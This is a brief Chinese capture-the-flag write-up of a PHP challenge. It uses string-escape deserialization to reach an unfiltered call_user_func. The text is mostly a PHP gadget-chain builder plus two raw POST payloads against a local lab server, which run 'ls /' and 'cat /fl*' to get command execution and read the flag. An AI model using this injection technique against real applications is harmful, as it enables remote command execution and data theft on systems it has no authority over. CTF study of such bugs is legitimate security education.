字符串逃逸反序列化，call_user_func没有对任何函数进行过滤，传入system执行任意命令即可

```JSON
<?php
class D1 {
    public $test1;
    public $test2;
    
    public function __construct() {
        $this->test1 = "system";
        $this->test2 = "cat /fl*";
    }
}
class C1 {
    public $test1;
    
    public function __construct() {
        $this->test1 = new D1();
    }
}
// echo serialize(new C1());
$c = new C1();
$a = array(11,$c);
echo serialize($a);
```

搜flag

```JSON
POST /index.php HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 223

a=fakesfakesfakesfakesfakesfakesfakesfakesfakesfakesfakesfakesfakesfakesfakesfakesfakesfakesfakesfakes&b=;s:5:"test2";a:2:{i:0;i:12;i:0;O:2:"C1":1:{s:5:"test1";O:2:"D1":2:{s:5:"test1";s:6:"system";s:5:"test2";s:4:"ls /";}}}
```

读flag

```JSON
POST /index.php HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 227

a=fakesfakesfakesfakesfakesfakesfakesfakesfakesfakesfakesfakesfakesfakesfakesfakesfakesfakesfakesfakes&b=;s:5:"test2";a:2:{i:0;i:12;i:1;O:2:"C1":1:{s:5:"test1";O:2:"D1":2:{s:5:"test1";s:6:"system";s:5:"test2";s:8:"cat /fl*";}}}
```